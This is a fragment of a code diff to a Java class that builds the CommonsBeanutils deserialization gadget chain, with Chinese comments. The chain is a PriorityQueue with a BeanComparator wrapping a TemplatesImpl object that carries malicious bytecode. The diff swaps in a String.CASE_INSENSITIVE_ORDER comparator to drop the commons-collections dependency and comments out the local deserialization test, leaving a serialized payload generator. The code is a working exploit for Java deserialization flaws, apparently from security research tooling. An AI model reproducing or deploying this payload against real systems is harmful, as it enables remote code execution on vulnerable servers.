@@ -19,7 +19,7 @@ public class CommonsBeanutils {
         // 创建恶意 TemplatesImpl 对象,_bytecodes 属性装载着恶意字节码
         TemplatesImpl templatesImpl = CreateTemplatesImpl.createTemplatesImpl();
         // 创建比较器
-        BeanComparator beanComparator = new BeanComparator();
+        BeanComparator beanComparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
         PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
         // 先用 add 添加元素,否则后面对 queue[] 数组的操作无法把真正的元素添加到 priorityQueue 中
         priorityQueue.add("1");
@@ -37,6 +37,6 @@ public class CommonsBeanutils {
         ParseArgs.parseArgs(args);
         PriorityQueue priorityQueue = (PriorityQueue) getObject();
         byte[] bytes = SerWithUnSer.serialize(priorityQueue);
-        SerWithUnSer.unSerialize(bytes);
+        //SerWithUnSer.unSerialize(bytes);
     }
 }
